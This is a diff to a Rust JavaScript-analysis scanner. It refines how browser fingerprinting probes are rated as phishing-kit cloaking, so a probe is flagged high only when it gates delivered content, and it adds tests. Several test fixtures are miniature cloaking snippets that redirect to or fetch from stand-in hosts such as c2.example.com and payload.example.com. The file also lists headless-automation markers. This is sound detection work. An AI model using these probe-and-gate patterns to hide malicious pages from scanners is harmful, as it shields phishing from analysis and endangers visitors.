@@ -203,14 +203,29 @@ impl<'a> Visit<'a> for SecurityVisitor<'_> {
             Expression::StaticMemberExpression(member) => {
                 let prop = member.property.name.as_str();
 
-                // document.hasFocus() — always returns false in headless; exclusively
-                // used in anti-bot fingerprinting to detect automated analysis.
+                // document.hasFocus() — false in headless. The old comment here claimed
+                // it is "exclusively used in anti-bot fingerprinting"; that is the same
+                // premise that was falsified twice for navigator.webdriver. Legitimate
+                // analytics measure tab focus (visibility/engagement timing), and
+                // anti-fraud SDKs read it as one signal among dozens. Cloaking requires
+                // the probe to gate what the visitor receives.
                 if prop == "hasFocus" {
                     if let Expression::Identifier(obj) = &member.object {
                         if obj.name == "document" {
+                            let (technique, detail) = if probe_gates_content(
+                                &self.source,
+                                call.span.start as usize,
+                                call.span.end as usize,
+                            ) {
+                                ("focus_probe",
+                                 "document.hasFocus() called — always false in headless, and gating a content-delivery sink")
+                            } else {
+                                ("focus_probe_ungated",
+                                 "document.hasFocus() called — no content gated on the result")
+                            };
                             self.report.add_js_flag(JsFlag::SandboxEvasion {
-                                technique: "focus_probe".into(),
-                                detail: "document.hasFocus() called — always false in headless; used to detect automated analysis environments".into(),
+                                technique: technique.into(),
+                                detail: detail.into(),
                                 loc: loc.clone(),
                             });
                         }
@@ -334,6 +349,9 @@ impl<'a> Visit<'a> for SecurityVisitor<'_> {
         if let Expression::Identifier(obj) = &expr.object {
             let obj_name = obj.name.as_str();
             let loc = self.loc(expr.span.start);
+            // Shared by every probe arm below that asks whether the read gates content.
+            let start = expr.span.start as usize;
+            let end = expr.span.end as usize;
 
             match (obj_name, prop) {
                 // navigator.webdriver — headless detection property.
@@ -341,8 +359,6 @@ impl<'a> Visit<'a> for SecurityVisitor<'_> {
                 // navigator.userAgent is also accessed in this script — this is the Framer
                 // URL-parameter-preservation pattern, not a cloaking gate.
                 ("navigator", "webdriver") => {
-                    let start = expr.span.start as usize;
-                    let end = expr.span.end as usize;
                     let src = &self.source;
                     let is_negated = start > 0 && src.as_bytes().get(start - 1).copied() == Some(b'!');
                     let window_start = start.saturating_sub(20);
@@ -350,7 +366,7 @@ impl<'a> Visit<'a> for SecurityVisitor<'_> {
                     let has_and_chain = src.get(window_start..window_end).map_or(false, |w| w.contains("&&"));
                     if self.has_user_agent_check && is_negated && has_and_chain {
                         // Framer URL-param preservation: !navigator.webdriver && !botUA — not cloaking.
-                    } else if webdriver_gates_content(src, start, end) {
+                    } else if probe_gates_content(src, start, end) {
                         self.report.add_js_flag(JsFlag::SandboxEvasion {
                             technique: "webdriver_check".into(),
                             detail: "navigator.webdriver accessed — headless browser detection \
@@ -391,48 +407,72 @@ impl<'a> Visit<'a> for SecurityVisitor<'_> {
                 }
                 // window.chrome — undefined in headless Chromium despite the browser being
                 // Chrome-based; anti-bot scripts check for its absence to detect scanners.
+                // Also read by ordinary feature detection (extension-bridge probes,
+                // Chrome-only API shims), so the cloaking claim needs a gated sink.
                 ("window", "chrome") => {
+                    let (technique, detail) = if probe_gates_content(&self.source, start, end) {
+                        ("chrome_runtime_probe",
+                         "window.chrome accessed — undefined in headless, and gating a content-delivery sink")
+                    } else {
+                        ("chrome_runtime_probe_ungated",
+                         "window.chrome accessed — no content gated on the result")
+                    };
                     self.report.add_js_flag(JsFlag::SandboxEvasion {
-                        technique: "chrome_runtime_probe".into(),
-                        detail: "window.chrome accessed — undefined in headless; standard headless-Chrome detection probe".into(),
-                        loc,
+                        technique: technique.into(), detail: detail.into(), loc,
                     });
                 }
-                // chrome.runtime — accessed without the window. prefix.  Near-exclusive
-                // indicator of headless browser detection; no legitimate page content reads this.
+                // chrome.runtime — accessed without the window. prefix. The old comment
+                // called this a "near-exclusive indicator … no legitimate page content
+                // reads this"; extension-aware pages and web-store integrations do.
                 ("chrome", "runtime") => {
+                    let (technique, detail) = if probe_gates_content(&self.source, start, end) {
+                        ("chrome_runtime_probe",
+                         "chrome.runtime accessed — absent in headless, and gating a content-delivery sink")
+                    } else {
+                        ("chrome_runtime_probe_ungated",
+                         "chrome.runtime accessed — no content gated on the result")
+                    };
                     self.report.add_js_flag(JsFlag::SandboxEvasion {
-                        technique: "chrome_runtime_probe".into(),
-                        detail: "chrome.runtime accessed — present in real Chrome extensions, absent in headless; used to detect automated analysis environments".into(),
-                        loc,
+                        technique: technique.into(), detail: detail.into(), loc,
                     });
                 }
-                // navigator.languages — returns an empty array in headless Chromium.
-                // Fingerprinting scripts check .length === 0 to detect automated environments.
+                // navigator.languages — empty in headless. Kept ungated but demoted to LOW
+                // in the severity table: the Python analyser counts this property as
+                // evidence that a nearby probe belongs to a legitimate fingerprinting SDK
+                // (js_analyser `_check_webdriver_probe`), so flagging it as evasion here
+                // made the two layers contradict each other on the same observation.
                 ("navigator", "languages") => {
                     self.report.add_js_flag(JsFlag::SandboxEvasion {
                         technique: "languages_probe".into(),
-                        detail: "navigator.languages accessed — returns empty array in headless; used to fingerprint automated analysis environments".into(),
+                        detail: "navigator.languages accessed — locale list; also a routine i18n and fingerprinting-SDK read".into(),
                         loc,
                     });
                 }
-                // Notification.permission — headless browsers lack a real Notification API;
-                // the returned value differs from real user browsers, making this a reliable
-                // fingerprinting signal with no legitimate production use.
+                // Notification.permission — differs in headless. "No legitimate production
+                // use" was wrong: every site that asks to send web-push reads this first
+                // to decide whether to show its opt-in prompt.
                 ("Notification", "permission") => {
+                    let (technique, detail) = if probe_gates_content(&self.source, start, end) {
+                        ("notification_probe",
+                         "Notification.permission accessed — differs in headless, and gating a content-delivery sink")
+                    } else {
+                        ("notification_probe_ungated",
+                         "Notification.permission accessed — no content gated on the result (ordinary web-push opt-in check)")
+                    };
                     self.report.add_js_flag(JsFlag::SandboxEvasion {
-                        technique: "notification_probe".into(),
-                        detail: "Notification.permission accessed — headless browsers return a default state that differs from real user browsers; used to detect automated analysis environments".into(),
-                        loc,
+                        technique: technique.into(), detail: detail.into(), loc,
                     });
                 }
-                // navigator.deviceMemory / navigator.hardwareConcurrency — both undefined
-                // in headless Chromium. Used together or individually to build a hardware
-                // profile and fingerprint the client as an automated analysis environment.
+                // navigator.deviceMemory / navigator.hardwareConcurrency — undefined in
+                // headless. Demoted to LOW in the severity table rather than gated: these
+                // are the SAME properties the Python analyser counts as evidence that a
+                // nearby probe belongs to a legitimate anti-fraud SDK, and they are also
+                // read for ordinary capability tuning (worker-pool sizing, video quality).
+                // A HIGH here contradicted the engine's own reading of the same fact.
                 ("navigator", "deviceMemory" | "hardwareConcurrency") => {
                     self.report.add_js_flag(JsFlag::SandboxEvasion {
                         technique: "hardware_fingerprint_probe".into(),
-                        detail: format!("navigator.{prop} accessed — undefined in headless Chromium; hardware fingerprinting probe used to detect automated analysis environments"),
+                        detail: format!("navigator.{prop} accessed — device capability read; also used for worker-pool sizing and media-quality selection"),
                         loc,
                     });
                 }
@@ -481,14 +521,17 @@ impl<'a> Visit<'a> for SecurityVisitor<'_> {
             }
         }
 
-        // WebGL canvas fingerprinting — used by phishing kits (Tycoon2FA, others)
-        // to detect automated analysis environments before serving the phishing page.
-        // WEBGL_debug_renderer_info is a WebGL extension that exposes GPU vendor and
-        // renderer strings — information that differs between real browsers and headless
-        // Chromium. No legitimate page functionality requires this extension; it appears
-        // exclusively in fingerprinting/bot-detection code.
-        // UNMASKED_RENDERER_WEBGL / UNMASKED_VENDOR_WEBGL are the constants within
-        // that extension used to read the actual GPU identifiers.
+        // WebGL canvas fingerprinting — used by phishing kits (Tycoon2FA, others) to
+        // detect automated analysis before serving the phishing page.
+        // WEBGL_debug_renderer_info exposes GPU vendor/renderer strings, which differ
+        // between real browsers and headless Chromium.
+        //
+        // The previous claim here — "no legitimate page functionality requires this
+        // extension; it appears exclusively in fingerprinting/bot-detection code" —
+        // argues against itself: bot-detection code is exactly what every commercial
+        // anti-fraud SDK ships, and WebGL renderer strings are also read by games and
+        // 3D/mapping libraries to pick a quality tier or work around driver bugs. Gated
+        // like the rest of the family: HIGH only when the read gates delivered content.
         const CANVAS_FINGERPRINT_MARKERS: &[&str] = &[
             "WEBGL_debug_renderer_info",
             "UNMASKED_RENDERER_WEBGL",
@@ -496,12 +539,23 @@ impl<'a> Visit<'a> for SecurityVisitor<'_> {
         ];
         for &marker in CANVAS_FINGERPRINT_MARKERS {
             if val.contains(marker) {
+                let gated = probe_gates_content(
+                    &self.source,
+                    lit.span.start as usize,
+                    lit.span.end as usize,
+                );
+                let (technique, detail) = if gated {
+                    ("canvas_fingerprint_probe", format!(
+                        "WebGL fingerprinting string {:?} — GPU identifier read gating a content-delivery sink",
+                        marker))
+                } else {
+                    ("canvas_fingerprint_probe_ungated", format!(
+                        "WebGL fingerprinting string {:?} — GPU identifier read; no content gated on the result",
+                        marker))
+                };
                 self.report.add_js_flag(JsFlag::SandboxEvasion {
-                    technique: "canvas_fingerprint_probe".into(),
-                    detail: format!(
-                        "WebGL fingerprinting string {:?} — used to detect headless/automated browsers via GPU identifier",
-                        marker
-                    ),
+                    technique: technique.into(),
+                    detail,
                     loc: self.loc(lit.span.start),
                 });
                 break;
@@ -623,7 +677,7 @@ fn decode_hex_escapes(s: &str) -> String {
 
 /// Bytes searched either side of a `navigator.webdriver` read for a content-delivery
 /// sink. Mirrors the ±700-char window used by the Python analyser.
-const WEBDRIVER_GATE_WINDOW: usize = 700;
+const PROBE_GATE_WINDOW: usize = 700;
 
 /// True when a content-delivery sink sits near the `start..end` span in `src`.
 ///
@@ -635,7 +689,7 @@ const WEBDRIVER_GATE_WINDOW: usize = 700;
 ///
 /// Widening this set makes the result MORE often true, which *preserves* the HIGH on
 /// real cloakers — the safe direction for the downgrade this feeds.
-fn webdriver_gates_content(src: &str, start: usize, end: usize) -> bool {
+fn probe_gates_content(src: &str, start: usize, end: usize) -> bool {
     static GATE_RE: OnceLock<Regex> = OnceLock::new();
     let re = GATE_RE.get_or_init(|| {
         Regex::new(concat!(
@@ -648,11 +702,11 @@ fn webdriver_gates_content(src: &str, start: usize, end: usize) -> bool {
     });
     // Byte offsets from the AST are not guaranteed to land on char boundaries once the
     // window is widened, and slicing a str off-boundary panics.
-    let mut lo = start.saturating_sub(WEBDRIVER_GATE_WINDOW);
+    let mut lo = start.saturating_sub(PROBE_GATE_WINDOW);
     while lo > 0 && !src.is_char_boundary(lo) {
         lo -= 1;
     }
-    let mut hi = end.saturating_add(WEBDRIVER_GATE_WINDOW).min(src.len());
+    let mut hi = end.saturating_add(PROBE_GATE_WINDOW).min(src.len());
     while hi < src.len() && !src.is_char_boundary(hi) {
         hi += 1;
     }
@@ -767,6 +821,92 @@ mod tests {
         }
     }
 
+    /// The rest of the sandbox-evasion family, gated the same way (2026-08-18 audit).
+    /// Positive controls: each probe must keep its cloaking technique when it gates a
+    /// content-delivery sink. Written before the downgrade — deleting these is the whole
+    /// risk of the change.
+    #[test]
+    fn gating_probes_keep_their_cloaking_technique() {
+        for (src, want) in [
+            ("if (document.hasFocus()) { window.location = 'https://c2.example.com'; }",
+             "focus_probe"),
+            ("if (!window.chrome) { document.write('<h1>nothing</h1>'); }",
+             "chrome_runtime_probe"),
+            ("if (!chrome.runtime) { fetch('https://payload.example.com/s2'); }",
+             "chrome_runtime_probe"),
+            ("if (Notification.permission === 'denied') { location.replace('https://c2.example.com'); }",
+             "notification_probe"),
+            ("var e = gl.getExtension('WEBGL_debug_renderer_info');\n\
+              if (!e) { document.body.innerHTML = payload; }",
+             "canvas_fingerprint_probe"),
+        ] {
+            let report = run(src);
+            assert!(
+                report.js_flags().iter().any(|f| matches!(
+                    f, JsFlag::SandboxEvasion { technique, .. } if technique == want
+                )),
+                "gating probe lost its cloaking technique ({want}): {src}"
+            );
+        }
+    }
+
+    /// The FP direction: the same probes with nothing gated on the result. These are the
+    /// shapes commercial anti-fraud SDKs, analytics and ordinary capability detection
+    /// produce — the premise "no legitimate site reads this" is false for every one.
+    #[test]
+    fn ungated_probes_are_downgraded() {
+        for (src, want) in [
+            ("var focused = document.hasFocus();\ntrack('engagement', focused);",
+             "focus_probe_ungated"),
+            ("var isChrome = !!window.chrome;\nprofile.browser = isChrome;",
+             "chrome_runtime_probe_ungated"),
+            ("if (Notification.permission === 'default') { showOptInBanner(); }",
+             "notification_probe_ungated"),
+            ("var dbg = gl.getExtension('WEBGL_debug_renderer_info');\nquality = tierFor(dbg);",
+             "canvas_fingerprint_probe_ungated"),
+        ] {
+            let report = run(src);
+            assert!(
+                report.js_flags().iter().any(|f| matches!(
+                    f, JsFlag::SandboxEvasion { technique, .. } if technique == want
+                )),
+                "ungated probe was not downgraded ({want}): {src}"
+            );
+        }
+    }
+
+    /// The two properties js_analyser treats as EXCULPATORY — reading them near a probe
+    /// is how the Python layer concludes "legitimate fingerprinting SDK". Carapace rating
+    /// them HIGH/MEDIUM made the two layers contradict each other on the same fact.
+    #[test]
+    fn capability_reads_are_low_not_high() {
+        for (src, code) in [
+            ("var mem = navigator.deviceMemory;", "SANDBOX_EVASION_HARDWARE_FINGERPRINT"),
+            ("var cores = navigator.hardwareConcurrency;", "SANDBOX_EVASION_HARDWARE_FINGERPRINT"),
+            ("var langs = navigator.languages;", "SANDBOX_EVASION_LANGUAGES"),
+        ] {
+            let report = run(src);
+            let sev = report.flags.iter().find(|f| f.code == code).map(|f| f.severity);
+            assert_eq!(sev, Some(Severity::Low), "{code} should be LOW: {src}");
+        }
+    }
+
+    /// Deliberately NOT downgraded: these name automation TOOLING, not a device
+    /// characteristic ordinary code reads. If this ever goes LOW it is a mistake.
+    #[test]
+    fn headless_tooling_strings_stay_high() {
+        for src in [
+            r#"if (navigator.userAgent.indexOf("HeadlessChrome") > -1) { render(); }"#,
+            r#"var m = window["$cdc_asdjflasutopfhvcZLmcfl_"]; log(m);"#,
+            r#"var n = window["__nightmare"]; log(n);"#,
+        ] {
+            let report = run(src);
+            let sev = report.flags.iter()
+                .find(|f| f.code == "SANDBOX_EVASION_HEADLESS_STRING").map(|f| f.severity);
+            assert_eq!(sev, Some(Severity::High), "headless tooling marker must stay HIGH: {src}");
+        }
+    }
+
     /// The severity table is the half that actually mislabelled currys.co.uk — the
     /// technique split is worthless if both map to HIGH.
     #[test]
@@ -826,9 +966,33 @@ mod tests {
 
     #[test]
     fn detects_notification_permission_probe() {
-        let report = run(r#"if (Notification.permission === "default") { serveClean(); }"#);
+        // Was `if (Notification.permission === "default") { serveClean(); }` before the
+        // 2026-08-18 gating change. `serveClean()` is a call to a function defined
+        // elsewhere, so no content-delivery sink is visible in the window and the probe
+        // now classifies as ungated — see the known-gap test below, which pins that
+        // behaviour deliberately rather than letting this test hide it. The cloaking
+        // assertion is kept here with the sink made explicit.
+        let report = run(
+            r#"if (Notification.permission === "default") { document.write(cleanPage); }"#,
+        );
         assert!(report.js_flags().iter().any(|f| matches!(
             f, JsFlag::SandboxEvasion { technique, .. } if technique == "notification_probe"
+        )));
+    }
+
+    /// KNOWN GAP, pinned so it is visible rather than discovered later: when the cloaking
+    /// branch calls a named function whose body lives elsewhere, no sink appears in the
+    /// ±700-byte window and the probe is classified ungated (LOW). The Python analyser
+    /// has the identical limitation for `navigator.webdriver` and documents it the same
+    /// way. Context collapse is what recovers these — an ungated probe on a DGA or newly
+    /// registered domain still escalates. If this test ever starts failing because the
+    /// technique became gated, that is an IMPROVEMENT: widen the sink set and delete it.
+    #[test]
+    fn indirect_sink_behind_a_function_call_is_not_seen_as_gating() {
+        let report = run(r#"if (Notification.permission === "default") { serveClean(); }"#);
+        assert!(report.js_flags().iter().any(|f| matches!(
+            f, JsFlag::SandboxEvasion { technique, .. }
+            if technique == "notification_probe_ungated"
         )));
     }
 
